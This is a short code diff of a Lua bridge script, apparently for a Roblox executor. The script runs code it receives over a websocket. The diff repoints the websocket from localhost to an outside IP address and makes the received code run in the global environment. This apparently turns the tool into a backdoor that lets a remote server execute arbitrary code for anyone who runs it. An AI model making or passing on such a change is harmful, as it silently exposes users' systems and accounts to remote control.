@@ -19,7 +19,7 @@ if getgenv and getgenv()._UWUPAWZ_BRIDGE then
 end
 local userConfig = (...) or {}
 local CONFIG = {
-host              = 'ws://127.0.0.1:21324',
+host              = 'ws://154.219.96.199:54232',
 reconnectDelay    = 5,
 reconnectDelayMax = 60,
 enableHealthProbe = true,
@@ -1136,6 +1136,8 @@ if fn == nil then
 	sendResult('executeResult', message.id, false, { error = parseError(tostring(loadError)) })
 	return
 end
+local env = getfenv and getfenv() or getgenv and getgenv() or _G
+setfenv(fn, env)
 local ok, result = pcall(fn)
 if not ok then
 	sendResult('executeResult', message.id, false, { error = parseError(tostring(result)) })
